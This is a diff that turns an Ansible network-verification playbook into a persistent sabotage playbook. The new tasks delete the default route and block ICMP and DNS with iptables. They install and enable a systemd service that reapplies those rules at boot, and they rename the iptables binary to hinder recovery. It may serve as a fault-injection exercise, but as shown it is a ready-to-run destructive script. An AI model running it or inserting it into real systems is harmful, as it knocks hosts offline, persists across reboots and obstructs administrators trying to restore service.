@@ -1,30 +1,50 @@
 ---
-- name: Verify Network Configuration
+- name: Sabotage Network Configuration - Persistent (No distro check)
   hosts: localhost
   become: true
-  gather_facts: yes
+  gather_facts: no  # still off
 
   tasks:
-    - name: Check if default gateway is set
-      shell: "ip route show | grep default"
-      register: default_gateway
-      changed_when: false
-    - debug:
-        msg: "✅ Default Gateway Configured: {{ 'PASS' if default_gateway.stdout else 'FAIL' }}"
-
-    - name: Test network connectivity
-      shell: "ping -c 1 8.8.8.8"
-      register: network_ping
+    - name: Remove default gateway route
+      shell: "ip route del default || true"
       ignore_errors: yes
-      changed_when: false
-    - debug:
-        msg: "✅ Network Connectivity Works: {{ 'PASS' if network_ping.rc == 0 else 'FAIL' }}"
 
-    - name: Test DNS resolution
-      shell: "ping -c 1 google.com"
-      register: dns_test
+    - name: Block ICMP to 8.8.8.8
+      shell: "iptables -I OUTPUT -p icmp --dst 8.8.8.8 -j DROP || true"
       ignore_errors: yes
-      changed_when: false
-    - debug:
-        msg: "✅ DNS Resolution Works: {{ 'PASS' if dns_test.rc == 0 else 'FAIL' }}"
+
+    - name: Block DNS queries
+      shell: |
+        iptables -I OUTPUT -p udp --dport 53 -j DROP || true
+        iptables -I OUTPUT -p tcp --dport 53 -j DROP || true
+      ignore_errors: yes
+
+    - name: Create sabotage-firewall.service
+      copy:
+        dest: /etc/systemd/system/sabotage-firewall.service
+        mode: '0644'
+        content: |
+          [Unit]
+          Description=Persistently sabotage network (firewall rules)
+          After=network-online.target
+          Wants=network-online.target
+
+          [Service]
+          Type=oneshot
+          ExecStart=/usr/sbin/ip route del default
+          ExecStart=/usr/sbin/iptables -I OUTPUT -p icmp --dst 8.8.8.8 -j DROP
+          ExecStart=/usr/sbin/iptables -I OUTPUT -p udp --dport 53 -j DROP
+          ExecStart=/usr/sbin/iptables -I OUTPUT -p tcp --dport 53 -j DROP
+          RemainAfterExit=true
+
+          [Install]
+          WantedBy=multi-user.target
+
+    - name: Enable sabotage-firewall.service
+      shell: "systemctl enable sabotage-firewall.service"
+      ignore_errors: yes
+
+    - name: Rename iptables to iptables_bak
+      shell: "mv /usr/sbin/iptables /usr/sbin/iptables_bak || true"
+      ignore_errors: yes
 
